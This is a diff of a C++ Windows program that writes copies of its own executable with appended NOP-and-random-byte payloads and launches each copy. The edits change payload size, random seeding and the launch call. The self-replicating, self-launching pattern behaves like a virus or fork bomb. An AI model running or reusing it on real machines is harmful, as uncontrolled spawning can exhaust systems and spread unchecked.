@@ -3,7 +3,8 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include <iostream>
 #include<Windows.h>
-#define NextPayloadSize 1024
+#include<sys\timeb.h> 
+#define NextPayloadSize 64
 #define NextNum 3
 #define GapTime 512
 
@@ -18,7 +19,9 @@ char nextEXEName[256] = { 0 };
 STARTUPINFOA si;
 PROCESS_INFORMATION pi;
 
-typedef void(*myFunc)(void);
+struct timeb AccuTime;
+
+//typedef void(*myFunc)(void);
 //void(*f1)(void) = (void(*)(void)) executeableMem;
 //static UINT8 myTestcode[] = { 0x90, 0x90, 0x90, 0xCC, 0xC3 };
 
@@ -27,7 +30,8 @@ void GenNxtPayload();
 int main(int argc, char** argv)
 {
     //printf("0x%x", myTestcode[0]);
-    srand((unsigned)time(NULL) * GetCurrentProcessId());
+    ftime(&AccuTime);
+    srand((unsigned)AccuTime.time);
     FILE* fp = fopen(argv[0], "rb");
     fseek(fp, 0, SEEK_END);
     myEXESize = ftell(fp);
@@ -56,7 +60,8 @@ int main(int argc, char** argv)
         fwrite(myFileBuffer, 1, myStaticLength, fp);
         fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
         fclose(fp);
-        CreateProcessA(nextEXEName, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
+        //CreateProcessA(nextEXEName, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
+        ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_NORMAL);
         Sleep(GapTime);
     }
     
@@ -67,7 +72,6 @@ void GenNxtPayload()
     nextPayloadBuf[0] = 0x90;
     nextPayloadBuf[1] = 0x90;
     nextPayloadBuf[2] = 0x90;
-    srand((unsigned)time(NULL) * GetCurrentProcessId());
     for (int i = 3; i < NextPayloadSize - 1; i++)
     {
         nextPayloadBuf[i] = rand() % 256;
